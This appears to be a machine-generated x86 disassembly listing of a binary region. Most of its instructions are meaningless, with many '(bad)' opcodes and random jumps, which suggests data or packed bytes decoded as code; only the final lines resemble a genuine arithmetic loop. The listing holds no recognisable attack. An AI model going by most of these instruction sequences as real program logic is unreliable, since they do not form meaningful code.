  4059aa:	inc    esi
  4059ab:	xor    eax,0x3c94f366
  4059b0:	sbb    DWORD PTR [ecx-0x6c],eax
  4059b3:	hlt    
  4059b4:	icebp  
  4059b5:	cwde   
  4059b6:	dec    ebx
  4059b7:	mov    eax,ds:0x283fd382
  4059bc:	repz pop edx
  4059be:	rol    dl,0xa8
  4059c1:	mov    edx,0x8eed63fe
  4059c6:	mov    ds:0x9314660c,al
  4059cb:	add    edx,esp
  4059cd:	push   edx
  4059ce:	inc    ecx
  4059cf:	xchg   ebx,eax
  4059d0:	test   al,0x77
  4059d2:	add    al,0x6e
  4059d4:	(bad)  
  4059d5:	push   ss
  4059d6:	pop    eax
  4059d7:	(bad)  
  4059d8:	push   esp
  4059d9:	mov    esp,0x3137ab55
  4059de:	iret   
  4059df:	fild   WORD PTR ds:0xd784cad7
  4059e5:	fucom  st(7)
  4059e7:	sub    ebx,DWORD PTR [ecx-0x4a823bad]
  4059ed:	outs   dx,BYTE PTR ds:[esi]
  4059ee:	cwde   
  4059ef:	out    0xef,eax
  4059f1:	pop    ebx
  4059f2:	ja     0x405a1b
  4059f4:	jns    0x405982
  4059f6:	inc    ebp
  4059f7:	xchg   edx,eax
  4059f8:	push   ebx
  4059f9:	push   ebp
  4059fa:	jns    0x4059e6
  4059fc:	leave  
  4059fd:	sub    eax,0x258baf19
  405a02:	ins    BYTE PTR es:[edi],dx
  405a03:	(bad)  
  405a04:	cld    
  405a05:	mov    fs,WORD PTR [edi]
  405a07:	sbb    esp,DWORD PTR [edi-0x49]
  405a0a:	(bad)  
  405a0b:	lock sbb DWORD PTR [edi+0x55],ecx
  405a0f:	jns    0x405a08
  405a11:	sub    eax,0xf2c511ce
  405a16:	dec    ebp
  405a17:	fistp  DWORD PTR [eax]
  405a19:	push   ebp
  405a1a:	das    
  405a1b:	or     eax,0x86631d82
  405a20:	sahf   
  405a21:	(bad)  
  405a22:	icebp  
  405a23:	div    ah
  405a25:	cs jmp 0x35652e05
  405a2b:	fld    TBYTE PTR gs:[eax]
  405a2e:	xor    DWORD PTR [esi-0x62],0x1f
  405a32:	scas   al,BYTE PTR es:[edi]
  405a33:	mov    eax,0x2d13ce85
  405a38:	int    0xff
  405a3a:	(bad)  
  405a3b:	daa    
  405a3c:	push   edx
  405a3d:	std    
  405a3e:	dec    bp
  405a40:	out    dx,eax
  405a41:	xor    dl,BYTE PTR [bx+si+0x2e]
  405a45:	mov    eax,0x1503cf14
  405a4a:	xor    eax,0xf5fe4c52
  405a4f:	jecxz  0x405a3a
  405a51:	hlt    
  405a52:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405a53:	dec    esp
  405a54:	xor    al,0xe1
  405a56:	(bad)  [ecx]
  405a58:	mov    bl,0x92
  405a5a:	nop
  405a5b:	sbb    cl,BYTE PTR [esi-0x53]
  405a5e:	test   eax,0x829b4659
  405a63:	in     al,0x5b
  405a65:	cmp    esp,0xffffffee
  405a68:	cmp    esi,edx
  405a6a:	call   0xcbc6:0x3b4e7aee
  405a71:	test   BYTE PTR [ebx-0x19],bh
  405a74:	cdq    
  405a75:	inc    ecx
  405a76:	scas   al,BYTE PTR es:[edi]
  405a77:	in     eax,dx
  405a78:	bt     DWORD PTR [ecx],edx
  405a7b:	mov    eax,0x33550c7e
  405a80:	mov    al,0x42
  405a82:	fmul   DWORD PTR [ebp*8-0xe9319a3]
  405a89:	addr16 cs mov dh,0x0
  405a8d:	inc    ebx
  405a8e:	in     al,0xa1
  405a90:	ins    DWORD PTR es:[edi],dx
  405a91:	test   al,dh
  405a93:	(bad)  
  405a94:	in     al,dx
  405a95:	mov    bl,0x19
  405a97:	retf   0x7b4a
  405a9a:	push   0x911f55d4
  405a9f:	lock (bad) 
  405aa2:	xchg   BYTE PTR [ebx-0xc],bl
  405aa5:	call   0x9ee575fd
  405aaa:	stos   BYTE PTR es:[edi],al
  405aab:	xlat   BYTE PTR ds:[ebx]
  405aac:	adc    dl,bl
  405aae:	mov    fs,WORD PTR [ecx+edi*2]
  405ab1:	cmp    ch,BYTE PTR [edx-0x4651715f]
  405ab7:	fdiv   st(2),st
  405ab9:	mov    BYTE PTR [edx+0xb06806d],0x50
  405ac0:	and    al,0x7
  405ac2:	sbb    eax,0x6b8a96c
  405ac7:	mov    esp,0xbe379dd2
  405acc:	cmp    BYTE PTR [esi],bh
  405ace:	and    dh,BYTE PTR [ebx]
  405ad0:	dec    edi
  405ad1:	adc    BYTE PTR [ecx+0x4da24b52],dh
  405ad7:	and    BYTE PTR [eax-0x3f337b29],0xeb
  405ade:	pop    ecx
  405adf:	and    al,0xf4
  405ae1:	fmul   DWORD PTR [esp+eax*2-0x22]
  405ae5:	push   ecx
  405ae6:	dec    ebp
  405ae7:	push   ss
  405ae8:	aam    0x5
  405aea:	outs   dx,DWORD PTR es:[esi]
  405aec:	ret    
  405aed:	test   eax,0x4f506679
  405af2:	inc    esi
  405af3:	aam    0xe3
  405af5:	inc    ebx
  405af6:	and    eax,0x7039e531
  405afb:	lods   al,BYTE PTR ds:[esi]
  405afc:	jmp    0xc16e:0x7c108202
  405b03:	mov    cl,0xb
  405b05:	xchg   esp,eax
  405b06:	cli    
  405b07:	arpl   dx,cx
  405b09:	inc    edx
  405b0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405b0b:	or     al,0xf
  405b0d:	nop
  405b0e:	mov    bh,0xb3
  405b10:	outs   dx,DWORD PTR ds:[esi]
  405b11:	int    0x8e
  405b13:	mov    WORD PTR [esi+esi*4],?
  405b16:	push   es
  405b17:	cs jmp 0x95071f8b
  405b1d:	into   
  405b1e:	sti    
  405b1f:	mov    ecx,0x78d8963e
  405b24:	loope  0x405b60
  405b26:	stos   BYTE PTR es:[edi],al
  405b27:	inc    edi
  405b28:	xor    eax,0x6677fa11
  405b2d:	or     BYTE PTR [bx+si-0x15],dl
  405b31:	fcomip st,st(3)
  405b33:	cwde   
  405b34:	sahf   
  405b35:	jnp    0x405afd
  405b37:	xchg   ebp,eax
  405b38:	cmp    eax,0xf929ae3e
  405b3d:	int    0x1
  405b3f:	sub    bh,ch
  405b41:	cmp    dl,dl
  405b43:	inc    edx
  405b44:	scas   al,BYTE PTR es:[edi]
  405b45:	jecxz  0x405b7e
  405b47:	sbb    DWORD PTR [ebx+esi*8],0x23
  405b4b:	dec    esp
  405b4c:	ret    
  405b4d:	and    al,0x24
  405b4f:	push   0x21
  405b51:	jl     0x405b51
  405b53:	adc    al,0x1f
  405b55:	pop    esi
  405b56:	dec    esp
  405b57:	js     0x405b73
  405b59:	(bad)  
  405b5a:	push   ebx
  405b5b:	xor    DWORD PTR [ebp+0x5f25975],ecx
  405b61:	in     al,0xb7
  405b63:	into   
  405b64:	icebp  
  405b65:	gs out 0x9c,al
  405b68:	mov    bl,0xc5
  405b6a:	push   edi
  405b6b:	push   edx
  405b6c:	out    dx,eax
  405b6d:	repnz sbb BYTE PTR ds:0xd46a990a,ah
  405b74:	les    ebx,FWORD PTR [edx]
  405b76:	dec    edx
  405b77:	ret    
  405b78:	jg     0x405b62
  405b7a:	mov    edi,0x92865db2
  405b7f:	sub    al,0x54
  405b81:	in     eax,0xdb
  405b83:	adc    ch,BYTE PTR [bx+si]
  405b86:	in     eax,0xfe
  405b88:	std    
  405b89:	inc    esp
  405b8a:	mov    al,0x76
  405b8c:	ins    BYTE PTR es:[edi],dx
  405b8d:	mov    ch,0xa3
  405b8f:	or     eax,DWORD PTR [edi]
  405b91:	or     dh,al
  405b93:	mov    al,ds:0x34c8e074
  405b98:	xor    al,BYTE PTR [edx]
  405b9a:	(bad)  
  405b9b:	xor    ebp,DWORD PTR [edi+0x67]
  405b9e:	push   ecx
  405b9f:	xor    DWORD PTR [ebx+0x7554d683],ebp
  405ba5:	mov    ch,0x96
  405ba7:	jno    0x405be6
  405ba9:	imul   ecx,DWORD PTR [ebx+0x37],0xffffff9b
  405bad:	test   BYTE PTR [edx-0x5f],ch
  405bb0:	out    0xb9,al
  405bb2:	enter  0x56b8,0x9e
  405bb6:	jmp    0x405c01
  405bb8:	ins    DWORD PTR es:[edi],dx
  405bb9:	mov    dl,0xfe
  405bbb:	lods   eax,DWORD PTR ds:[esi]
  405bbc:	mov    DWORD PTR [edx],eax
  405bbe:	(bad)  
  405bbf:	jl     0x405bec
  405bc1:	aam    0xaf
  405bc3:	js     0x405bae
  405bc5:	pop    ecx
  405bc6:	icebp  
  405bc7:	cwde   
  405bc8:	in     eax,dx
  405bc9:	push   ecx
  405bca:	hlt    
  405bcb:	or     eax,0xfc8166e0
  405bd0:	xchg   ecx,eax
  405bd1:	ins    DWORD PTR es:[edi],dx
  405bd2:	cmc    
  405bd3:	ja     0x405b82
  405bd5:	(bad)  
  405bd6:	out    dx,eax
  405bd7:	add    al,0x68
  405bd9:	sub    al,0xae
  405bdb:	shl    BYTE PTR [esp-0x3c],cl
  405bdf:	jb     0x405b73
  405be1:	mov    ds:0x8c1be817,eax
  405be6:	ins    BYTE PTR es:[edi],dx
  405be7:	pop    ss
  405be8:	ins    DWORD PTR es:[edi],dx
  405be9:	daa    
  405bea:	pop    esi
  405beb:	fld    DWORD PTR [esi+ecx*4+0x71a8d38c]
  405bf2:	xor    eax,0x6d30866
  405bf7:	pop    edi
  405bf8:	mov    edx,0x80f1048f
  405bfd:	out    0xd8,eax
  405bff:	(bad)  
  405c00:	push   ecx
  405c01:	(bad)  
  405c02:	jne    0x405b94
  405c04:	mov    esp,0x60874a80
  405c09:	inc    eax
  405c0a:	ss sub eax,0xe3a37646
  405c10:	pop    ecx
  405c11:	imul   ebp,DWORD PTR ds:0x77e0ad45,0xfffffff4
  405c18:	faddp  st(4),st
  405c1a:	divps  xmm1,XMMWORD PTR [edx+0x5821cea4]
  405c21:	(bad)  
  405c22:	sub    eax,0x13eadeb
  405c27:	ja     0x405c60
  405c29:	arpl   WORD PTR [edx],ax
  405c2b:	mov    edx,0xf9d96f65
  405c30:	xor    al,bh
  405c32:	lods   al,BYTE PTR ds:[esi]
  405c33:	lods   al,BYTE PTR ds:[esi]
  405c34:	test   esp,0x48f59289
  405c3a:	and    esp,ebp
  405c3c:	repnz adc BYTE PTR [ebx+0x680696f],cl
  405c43:	sti    
  405c44:	icebp  
  405c45:	call   0x3e09:0x7a98e14a
  405c4c:	sahf   
  405c4d:	repnz hlt 
  405c4f:	push   cs
  405c50:	and    BYTE PTR [esi+0x3dd45cd7],bl
  405c56:	sub    DWORD PTR [ebp+edx*4-0x5e4080c0],ebx
  405c5d:	loope  0x405cc6
  405c5f:	push   ds
  405c60:	jb     0x405c7a
  405c62:	(bad)  
  405c63:	fs jmp 0x405c83
  405c66:	aas    
  405c67:	cmp    al,0x1e
  405c69:	and    BYTE PTR ds:0x4f7a3766,dh
  405c6f:	lods   al,BYTE PTR ds:[esi]
  405c70:	inc    ebp
  405c71:	jmp    0x405c73
  405c73:	cmp    dl,al
  405c75:	pop    edx
  405c76:	lea    ecx,[ecx-0x63]
  405c79:	into   
  405c7a:	ret    
  405c7b:	adc    ebp,DWORD PTR [edi-0x6e1f0017]
  405c81:	call   0x4d204d58
  405c86:	adc    BYTE PTR [esi-0x18],0x3
  405c8a:	mov    eax,0x1439e43b
  405c8f:	lods   al,BYTE PTR ds:[esi]
  405c90:	xchg   DWORD PTR [eax-0x20],ecx
  405c93:	cmp    BYTE PTR [edi+0x2d],bh
  405c96:	mov    ah,0xe6
  405c98:	lds    edi,FWORD PTR [ebx-0x52]
  405c9b:	daa    
  405c9c:	imul   edi,DWORD PTR [ebp-0x175f3103],0x4d
  405ca3:	sbb    ebp,DWORD PTR [esp+ebx*4+0x31fd9be6]
  405caa:	pop    esp
  405cab:	jns    0x405c63
  405cad:	iret   
  405cae:	add    al,dh
  405cb0:	lea    eax,[esi+0x15]
  405cb3:	mov    ebp,0xe0c9df95
  405cb8:	lock ins BYTE PTR es:[edi],dx
  405cba:	mov    cl,0x61
  405cbc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405cbd:	add    eax,0x2cb088b8
  405cc2:	cld    
  405cc3:	or     ebx,DWORD PTR [eax]
  405cc5:	sahf   
  405cc6:	pop    esp
  405cc7:	mov    ds:0x585547d7,eax
  405ccc:	jns    0x405d1c
  405cce:	add    ah,cl
  405cd0:	push   cs
  405cd1:	pushf  
  405cd2:	xchg   ebx,eax
  405cd3:	outs   dx,BYTE PTR gs:[esi]
  405cd5:	adc    eax,0x5c8b1a77
  405cda:	add    DWORD PTR [edi+0x6224f960],ecx
  405ce0:	mov    esi,edi
  405ce2:	jge    0x405d39
  405ce4:	or     BYTE PTR [esi],0x32
  405ce7:	repz mov es,esp
  405cea:	(bad)  
  405ceb:	stos   DWORD PTR es:[edi],eax
  405cec:	fstp   QWORD PTR ds:0x564c7c29
  405cf2:	(bad)  
  405cf3:	pop    ds
  405cf4:	int3   
  405cf5:	pop    edx
  405cf6:	mov    ebx,DWORD PTR [ebx+0x43ec12fb]
  405cfc:	xlat   BYTE PTR ds:[ebx]
  405cfd:	sub    ebp,DWORD PTR [esi]
  405cff:	shl    bh,1
  405d01:	inc    eax
  405d02:	or     edx,DWORD PTR [edx]
  405d04:	pop    edx
  405d05:	xor    eax,0x3e6e07c4
  405d0a:	xchg   BYTE PTR [eax-0x2a],bh
  405d0d:	lea    edx,[ecx]
  405d0f:	outs   dx,DWORD PTR ds:[esi]
  405d10:	mov    al,ds:0xa40f84c7
  405d15:	pop    ss
  405d16:	push   cs
  405d17:	stos   DWORD PTR es:[edi],eax
  405d18:	xchg   DWORD PTR [eax],esp
  405d1a:	mov    ebx,edx
  405d1c:	push   ds
  405d1d:	icebp  
  405d1e:	rcr    DWORD PTR [ecx],1
  405d20:	adc    eax,0xb8c84b36
  405d25:	mov    cl,0xae
  405d27:	pop    esp
  405d28:	repz pop ebx
  405d2a:	imul   ebx,esi,0xfadcfa0c
  405d30:	jae    0x405d53
  405d32:	gs jne 0x405d39
  405d35:	inc    edx
  405d36:	or     cl,BYTE PTR [ebp*4+0x19a666c3]
  405d3d:	mov    bh,bl
  405d3f:	xchg   DWORD PTR [bx+si+0x499],eax
  405d44:	add    ah,BYTE PTR [esi+0x33]
  405d47:	stos   DWORD PTR es:[edi],eax
  405d48:	cdq    
  405d49:	dec    ecx
  405d4a:	inc    edx
  405d4b:	fwait
  405d4c:	hlt    
  405d4d:	or     eax,ebx
  405d4f:	out    dx,al
  405d50:	adc    dl,ah
  405d52:	ret    
  405d53:	lea    edx,[edi]
  405d55:	cmp    dl,cl
  405d57:	lea    ebx,[edi]
  405d59:	mov    al,0xc3
  405d5b:	or     BYTE PTR [ecx-0x4a],cl
  405d5e:	in     eax,dx
  405d5f:	out    0x9d,eax
  405d61:	cmp    bl,BYTE PTR [edi-0x72]
  405d64:	out    dx,eax
  405d65:	enter  0x84e5,0x9e
  405d69:	clc    
  405d6a:	fyl2xp1 
  405d6c:	shr    esi,1
  405d6e:	jnp    0x405d19
  405d70:	pop    edi
  405d71:	out    0x8d,al
  405d73:	in     al,dx
  405d74:	imul   esi,DWORD PTR [ebp-0x2c0d35e7],0xaa8213f8
  405d7e:	pop    ds
  405d7f:	push   edi
  405d80:	scas   al,BYTE PTR es:[edi]
  405d81:	mov    ch,0x96
  405d83:	retf   0xc01c
  405d86:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405d87:	or     DWORD PTR [edx-0xb],edi
  405d8a:	fucomip st,st(1)
  405d8c:	add    DWORD PTR [ebx+ebp*2+0x8],ecx
  405d90:	cmp    BYTE PTR ds:[ecx+eiz*4],dh
  405d94:	rcl    DWORD PTR [edi-0x1ae8e286],0x61
  405d9b:	mov    esp,0xdd6305cd
  405da0:	pop    esp
  405da1:	lock sub eax,0x934b38ee
  405da7:	and    eax,0x65c453d8
  405dac:	(bad)  
  405dad:	test   DWORD PTR [esi+0x33998f91],edi
  405db3:	xor    BYTE PTR [esi],ch
  405db5:	call   ebp
  405db7:	fld    TBYTE PTR [eax+0x46]
  405dba:	xchg   edi,eax
  405dbb:	test   ebx,ebp
  405dbd:	jle    0x405d9f
  405dbf:	fdivr  DWORD PTR [eax-0x34]
  405dc2:	sub    DWORD PTR [ebx+0x43],ebx
  405dc5:	xchg   esi,ebp
  405dc7:	add    eax,0xb5b2a06e
  405dcc:	popa   
  405dcd:	das    
  405dce:	or     eax,0x86865de8
  405dd3:	in     al,dx
  405dd4:	pushw  cs
  405dd6:	adc    dl,BYTE PTR [edi]
  405dd8:	in     al,dx
  405dd9:	loopne 0x405d62
  405ddb:	cmc    
  405ddc:	cs mov edx,0x3255ab8a
  405de2:	lds    ebp,FWORD PTR [edx-0x53]
  405de5:	or     bl,BYTE PTR [ebx-0x7ae3003]
  405deb:	sub    dl,dl
  405ded:	sti    
  405dee:	push   esi
  405def:	bound  ebx,QWORD PTR [esi]
  405df1:	test   BYTE PTR [edx-0x38],ah
  405df4:	int    0x42
  405df6:	ficom  WORD PTR [edx+0x2c81a503]
  405dfc:	and    ah,BYTE PTR [ebx+0x17]
  405dff:	xchg   ecx,eax
  405e00:	mov    cl,0x9a
  405e02:	pop    ebp
  405e03:	(bad)  
  405e05:	cdq    
  405e06:	les    ebx,FWORD PTR ds:0x52875fda
  405e0c:	xor    BYTE PTR [edx+0x1004f95a],ah
  405e12:	pushf  
  405e13:	mov    edi,0xde39f1e9
  405e18:	pop    edx
  405e19:	jecxz  0x405da0
  405e1b:	xchg   ecx,eax
  405e1c:	or     bh,BYTE PTR [esi+0x29]
  405e1f:	lahf   
  405e20:	or     cl,BYTE PTR [ebp+ebx*4-0x65]
  405e24:	scas   al,BYTE PTR es:[edi]
  405e25:	add    DWORD PTR [ecx+ebp*1-0x4a],ebx
  405e29:	in     al,0xda
  405e2b:	sbb    BYTE PTR [esi-0x7b],ch
  405e2e:	jbe    0x405e4f
  405e30:	or     BYTE PTR [edi+ecx*1],ah
  405e33:	sub    eax,0x760f6bd5
  405e38:	jns    0x405e4f
  405e3a:	pop    ebx
  405e3b:	mov    esi,0x2333f6b1
  405e40:	mov    ebp,0x17032b3e
  405e45:	cmp    al,0x1
  405e47:	cdq    
  405e48:	(bad)  
  405e49:	pop    edi
  405e4a:	(bad)  
  405e4b:	push   ebp
  405e4c:	mov    eax,DWORD PTR [ebp-0x3d11723]
  405e52:	sahf   
  405e53:	sbb    DWORD PTR [edx+0x49],ecx
  405e56:	jb     0x405dec
  405e58:	push   0x139270b1
  405e5d:	adc    bl,dh
  405e5f:	push   ebx
  405e60:	loope  0x405e7a
  405e62:	pop    eax
  405e63:	(bad)
  405e66:	cli    
  405e67:	rep stos DWORD PTR es:[edi],eax
  405e69:	neg    BYTE PTR [ebx+0x4b]
  405e6c:	ret    0x6ef0
  405e6f:	mov    ch,0x8b
  405e71:	daa    
  405e72:	sbb    ebx,DWORD PTR [eax-0x71]
  405e75:	cs pop eax
  405e77:	(bad)  
  405e78:	pushf  
  405e79:	xlat   BYTE PTR ds:[ebx]
  405e7a:	push   ebp
  405e7b:	mov    WORD PTR [edi-0x579552ce],ss
  405e81:	shl    DWORD PTR [ebp-0x5535fb6f],cl
  405e87:	aam    0xad
  405e89:	rcr    BYTE PTR [esi-0x111fdeaf],0xa7
  405e90:	jl     0x405e93
  405e92:	mov    ds:0xae21ab26,al
  405e97:	xor    eax,0xf4ca1a9c
  405e9c:	inc    ecx
  405e9d:	dec    eax
  405e9e:	retf   
  405e9f:	sahf   
  405ea0:	(bad)  
  405ea1:	and    eax,0x7d5d7c2e
  405ea6:	jno    0x405e59
  405ea8:	jnp    0x405ebc
  405eaa:	int3   
  405eab:	(bad)  
  405eac:	fidiv  WORD PTR [ebx+0xf7addb2]
  405eb2:	dec    esi
  405eb3:	sahf   
  405eb4:	(bad)  
  405eb5:	shr    BYTE PTR [ebp+edi*4-0x721f6590],cl
  405ebc:	jl     0x405ee0
  405ebe:	inc    ebp
  405ebf:	inc    esi
  405ec0:	fwait
  405ec1:	dec    edi
  405ec2:	fdiv   st(0),st
  405ec4:	mov    al,0x68
  405ec6:	sub    al,0x1e
  405ec8:	and    al,0x3b
  405eca:	ret    
  405ecb:	sar    ebx,1
  405ecd:	mov    eax,ds:0x39dffeeb
  405ed2:	mov    al,0x23
  405ed4:	mov    ah,ch
  405ed6:	pop    es
  405ed7:	imul   eax,DWORD PTR [ecx-0xcc76f8d],0x72df7c92
  405ee1:	pop    esp
  405ee2:	mov    BYTE PTR [eax-0x7418eb74],al
  405ee8:	(bad)  
  405ee9:	adc    ah,BYTE PTR [ecx]
  405eeb:	adc    DWORD PTR [edx],0xd723f1cd
  405ef1:	js     0x405f6f
  405ef3:	cmp    BYTE PTR [eax-0x5e],0xe9
  405ef7:	and    DWORD PTR [ecx-0x5e435275],eax
  405efd:	cmp    eax,0xaa8447a7
  405f02:	mov    bh,BYTE PTR [ecx+0x746df86]
  405f08:	cmp    DWORD PTR [ecx],eax
  405f0a:	add    DWORD PTR [esi-0x31],ecx
  405f0d:	in     al,dx
  405f0e:	loop   0x405f81
  405f10:	repnz dec edi
  405f12:	jecxz  0x405eba
  405f14:	xlat   BYTE PTR ds:[ebx]
  405f15:	mov    bh,0x7f
  405f17:	test   eax,0xfebcfe1a
  405f1c:	scas   eax,DWORD PTR es:[edi]
  405f1d:	cmp    BYTE PTR [edi-0x3f97ca52],0x7c
  405f24:	add    eax,ebx
  405f26:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405f27:	add    ch,BYTE PTR [eax+0x28]
  405f2a:	fsubr  st(4),st
  405f2c:	sar    DWORD PTR [ebx-0x103abcf5],1
  405f32:	ins    DWORD PTR es:[edi],dx
  405f33:	sbb    al,BYTE PTR [ecx-0x3e]
  405f36:	pop    esp
  405f37:	add    al,0xbb
  405f39:	popa   
  405f3a:	jmp    0x405f31
  405f3c:	dec    esi
  405f3d:	xchg   ecx,eax
  405f3e:	out    dx,al
  405f3f:	stc    
  405f40:	js     0x405eee
  405f42:	not    DWORD PTR [ebp+0x3f01bc59]
  405f48:	push   ss
  405f49:	pop    ss
  405f4a:	out    dx,al
  405f4b:	scas   eax,DWORD PTR es:[edi]
  405f4c:	test   eax,0x9e1ee589
  405f51:	xor    al,0x80
  405f53:	jg     0x405f13
  405f55:	mov    bh,0x57
  405f57:	std    
  405f58:	sar    BYTE PTR [esp+esi*4-0x1f],1
  405f5c:	jne    0x405f1c
  405f5e:	aam    0xed
  405f60:	rol    DWORD PTR [ecx+0x3c],1
  405f63:	cld    
  405f64:	mov    esp,0xeaea0a08
  405f69:	popa   
  405f6a:	mov    cl,0x14
  405f6c:	mov    edx,0xa382b210
  405f71:	int3   
  405f72:	loop   0x405f26
  405f74:	sbb    al,0xa8
  405f76:	adc    DWORD PTR [ebp-0x5],ecx
  405f79:	fisttp WORD PTR [ebx]
  405f7b:	sbb    al,0x19
  405f7d:	popf   
  405f7e:	mov    bl,0x7e
  405f80:	scas   eax,DWORD PTR es:[edi]
  405f81:	mov    DWORD PTR [ebp+0x6ce19511],0x179fa2cf
  405f8b:	or     al,0x11
  405f8d:	jle    0x405f6c
  405f8f:	fild   WORD PTR [ecx]
  405f91:	in     eax,0x7a
  405f93:	xchg   esi,eax
  405f94:	add    al,0x3a
  405f96:	retf   0xd56f
  405f99:	xchg   ebp,eax
  405f9a:	inc    edx
  405f9b:	enter  0xc561,0xbd
  405f9f:	or     al,0x88
  405fa1:	ror    DWORD PTR [ecx-0x17b27f11],cl
  405fa7:	xchg   edi,eax
  405fa8:	and    esp,DWORD PTR [edx]
  405faa:	ins    DWORD PTR es:[edi],dx
  405fab:	pop    ds
  405fac:	daa    
  405fad:	int    0x26
  405faf:	dec    BYTE PTR [eax-0x6a]
  405fb2:	aas    
  405fb3:	aad    0xbc
  405fb5:	sbb    dh,bl
  405fb7:	jle    0x405f93
  405fb9:	jbe    0x405f74
  405fbb:	or     BYTE PTR [ebx-0x29cf4bf8],dl
  405fc1:	lds    esp,FWORD PTR [ecx-0x5ce9dbd0]
  405fc7:	mov    dh,0x36
  405fc9:	xchg   ebx,eax
  405fca:	mov    fs,WORD PTR [ecx-0x6e55772d]
  405fd0:	mov    ch,0x44
  405fd2:	(bad)  
  405fd3:	icebp  
  405fd4:	aam    0x14
  405fd6:	les    esi,FWORD PTR [edx]
  405fd8:	rol    BYTE PTR [ecx],0xb1
  405fdb:	xor    al,0x8c
  405fdd:	hlt    
  405fde:	imul   eax,DWORD PTR [esi+edx*8],0xea07a4f7
  405fe5:	mov    edi,0x77205452
  405fea:	jle    0x406015
  405fec:	add    esp,DWORD PTR [ebx-0x562644f2]
  405ff2:	dec    ebx
  405ff3:	pop    edx
  405ff4:	out    0x91,eax
  405ff6:	push   0x39
  405ff8:	adc    BYTE PTR [edx*2-0x1d21f1d0],al
  405fff:	(bad)  
  406000:	adc    al,0x4a
  406002:	retf   
  406003:	mov    DWORD PTR [ecx+0x38],esp
  406006:	enter  0xf785,0x95
  40600a:	sbb    esi,edi
  40600c:	in     al,0xb9
  40600e:	div    DWORD PTR gs:[ecx]
  406011:	fiadd  WORD PTR [ecx]
  406013:	push   edi
  406014:	jg     0x406004
  406016:	and    al,BYTE PTR [edx-0x3f1ad655]
  40601c:	pushf  
  40601d:	jno    0x406055
  40601f:	lock add eax,0xebcad553
  406025:	mov    eax,0xb73817ee
  40602a:	or     DWORD PTR [ebx],0xd0a12b2b
  406030:	icebp  
  406031:	lods   eax,DWORD PTR ds:[esi]
  406032:	add    DWORD PTR [esi],esi
  406034:	and    eax,0x5f18bc46
  406039:	sbb    cl,BYTE PTR [ecx+0x3a65505e]
  40603f:	pusha  
  406040:	push   ecx
  406041:	gs js  0x405ffb
  406044:	push   ebp
  406045:	dec    edi
  406046:	lahf   
  406047:	mov    bh,0x2a
  406049:	push   esi
  40604a:	jl     0x40603b
  40604c:	out    0x75,al
  40604e:	pusha  
  40604f:	and    DWORD PTR [eax-0x53],edx
  406052:	mov    esi,0x25092c2f
  406057:	hlt    
  406058:	xor    dl,ah
  40605a:	add    edi,eax
  40605c:	std    
  40605d:	jle    0x406091
  40605f:	(bad)  [esi]
  406061:	js     0x406057
  406063:	mov    ah,0x60
  406065:	xor    DWORD PTR [esi+edi*1-0x3f21d233],ebx
  40606c:	add    al,0xfb
  40606e:	gs push ecx
  406070:	mov    ah,0x2c
  406072:	pop    ecx
  406073:	and    BYTE PTR [edi+0x5a9133fb],cl
  406079:	and    DWORD PTR [ebx+0x70],esi
  40607c:	test   DWORD PTR [edx-0x455eece1],0x7006cc55
  406086:	std    
  406087:	xchg   esi,eax
  406088:	mov    dh,0xaf
  40608a:	mov    edi,0x2d16c749
  40608f:	cmc    
  406090:	popa   
  406091:	pop    edi
  406092:	aaa    
  406093:	retf   
  406094:	cmp    DWORD PTR [eax-0x52],esp
  406097:	imul   DWORD PTR [ecx+0x40]
  40609a:	dec    esp
  40609b:	nop
  40609c:	push   ebp
  40609d:	or     edi,DWORD PTR [edi]
  40609f:	pop    ds
  4060a0:	mov    ebx,ebp
  4060a2:	and    BYTE PTR [ecx-0x6693ae6a],0xa2
  4060a9:	cmp    esp,ebx
  4060ab:	push   ecx
  4060ac:	xchg   esp,eax
  4060ad:	jecxz  0x40607d
  4060af:	retf   
  4060b0:	xchg   esi,eax
  4060b1:	scas   eax,DWORD PTR es:[edi]
  4060b2:	jo     0x40610a
  4060b4:	out    0x59,eax
  4060b6:	dec    edi
  4060b7:	push   edx
  4060b8:	pop    es
  4060b9:	pop    esp
  4060ba:	inc    ecx
  4060bb:	lock std 
  4060bd:	scas   al,BYTE PTR es:[edi]
  4060be:	dec    esp
  4060bf:	ja     0x4060c1
  4060c1:	inc    ebx
  4060c2:	shl    DWORD PTR [edi],0x1
  4060c5:	fidiv  DWORD PTR [ecx]
  4060c7:	shr    DWORD PTR [eax-0x7abed4e8],1
  4060cd:	ret    
  4060ce:	in     eax,0x11
  4060d0:	pusha  
  4060d1:	jp     0x406146
  4060d3:	in     eax,0xb9
  4060d5:	js     0x4060c0
  4060d7:	(bad)  
  4060d8:	jcxz   0x40612b
  4060db:	xor    bl,ah
  4060dd:	(bad)  
  4060de:	aam    0x1a
  4060e0:	cmp    dh,bl
  4060e2:	push   ss
  4060e3:	call   ecx
  4060e5:	inc    ebx
  4060e6:	mov    dl,0x10
  4060e8:	popa   
  4060e9:	pop    esp
  4060ea:	adc    esi,DWORD PTR [ebp+0x3b]
  4060ed:	sbb    ecx,esp
  4060ef:	gs jge 0x406087
  4060f2:	sbb    ch,BYTE PTR [ebx-0x40fa8b4c]
  4060f8:	std    
  4060f9:	retf   
  4060fa:	fisttp QWORD PTR [edx+0x25]
  4060fd:	jge    0x40616a
  4060ff:	je     0x4060a5
  406101:	lods   al,BYTE PTR ds:[esi]
  406102:	adc    DWORD PTR [edi+edi*8+0x48895a0],eax
  406109:	sbb    cl,BYTE PTR [ebx+0x558bc045]
  40610f:	fdiv   DWORD PTR [ebx]
  406111:	(bad)  
  406112:	xor    edx,esi
  406114:	add    eax,edi
  406116:	add    edx,edi
  406118:	imul   eax,edx
  40611b:	add    eax,DWORD PTR [ebp-0xc]
  40611e:	mov    DWORD PTR [ebp-0xc],eax
  406121:	mov    eax,DWORD PTR [ebp-0xc]
  406124:	mov    edx,DWORD PTR [ebp-0x18]
  406127:	cmp    edx,eax
  406129:	jb     0x403ce7
  40612f:	mov    eax,DWORD PTR [ebp-0x28]
  406132:	mov    edx,DWORD PTR [ebp-0x18]
  406135:	xor    eax,esi
  406137:	add    eax,edi
  406139:	imul   eax,edx
  40613c:	mov    edx,DWORD PTR [ebp-0x1c]
  40613f:	xor    edx,esi
  406141:	add    edx,edi
  406143:	or     eax,edx
  406145:	mov    edx,DWORD PTR [ebp-0x20]
